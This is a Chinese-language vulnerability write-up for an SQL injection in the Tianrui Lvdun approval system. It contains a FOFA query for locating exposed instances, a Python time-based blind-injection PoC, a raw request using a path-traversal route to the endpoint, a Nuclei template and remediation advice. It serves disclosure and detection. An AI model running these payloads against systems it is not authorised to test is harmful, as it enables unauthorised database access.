# 天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞 |
| 漏洞类型 | SQL注入 (盲注/延时注入) |
| 影响组件 | 天锐绿盾审批系统 |
| 影响版本 | 通用版本 |

## 漏洞概述

天锐绿盾审批系统的 findUserPageExcludeCurrentUser.do 接口存在SQL注入漏洞，攻击者可以通过构造恶意的SQL查询参数，直接操控数据库查询语句，从而绕过身份验证，获取未授权的数据、修改数据库内容或执行其他恶意操作。该漏洞可能导致敏感信息泄露，例如用户数据或系统配置信息，严重影响系统的数据完整性和机密性。

## fofa查询语句

```
app="TIPPAY-绿盾审批系统"
```

## 漏洞复现

### POC

```python
#!/usr/bin/env python3
"""
天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞
POC - 检查漏洞是否存在 (延时注入)
"""
import requests
import sys
import time

def check_vulnerability(target_url, delay=4):
    """检查目标是否存在SQL注入漏洞"""
    target = target_url.rstrip('/') + "/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do"
    
    # 延时注入 payload
    payload = {
        "deptId": "1",
        "sort": f"a.ID_ OR (SELECT 1183 FROM (SELECT(SLEEP({delay})))UPad)"
    }
    
    try:
        start_time = time.time()
        response = requests.post(target, data=payload, timeout=15, verify=False)
        end_time = time.time()
        
        elapsed = end_time - start_time
        
        print(f"[+] 请求已发送: {target}")
        print(f"[*] Payload: {payload['sort']}")
        print(f"[*] 响应时间: {elapsed:.2f}秒")
        
        # 如果响应时间大于设定的延迟时间，说明存在漏洞
        if elapsed >= delay:
            print(f"[+] 漏洞存在! 响应延迟 {elapsed:.2f}秒")
            return True
        else:
            print(f"[-] 漏洞不存在或目标不可达")
            return False
    except requests.Timeout:
        print(f"[+] 漏洞存在! 请求超时(>{delay}秒)")
        return True
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc.py <target_url> [delay]")
        print("Example: python poc.py http://192.168.1.1:8080")
        print("Example: python poc.py http://192.168.1.1:8080 5")
        sys.exit(1)
    
    target_url = sys.argv[1]
    delay = int(sys.argv[2]) if len(sys.argv) > 2 else 4
    check_vulnerability(target_url, delay)
```

### 漏洞特征

- 路径：`/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do`
- 参数：`deptId`, `sort`
- HTTP方法：POST
- 注入类型：延时盲注 (SLEEP)

### 原始请求包

```
POST /trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

deptId=1&sort=a.ID_%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(4)))UPad)
```

### Nuclei 检测模板

```yaml
id: tianrui-lvding-sql-injection

info:
  name: 天锐绿盾审批系统 SQL注入
  author: 吾要学习
  severity: critical
  description: 天锐绿盾审批系统存在SQL注入漏洞

requests:
  - method: POST
    path:
      - "{{BaseURL}}/trwfe/1ogin.jsp/../user/findUserPageExcludeCurrentUser.do"
    body: "deptId=1&sort=a.ID_%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(4)))UPad)"
    matchers:
      - type: dsl
        dsl:
          - "duration>=4"
        condition: and
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加 Web 应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
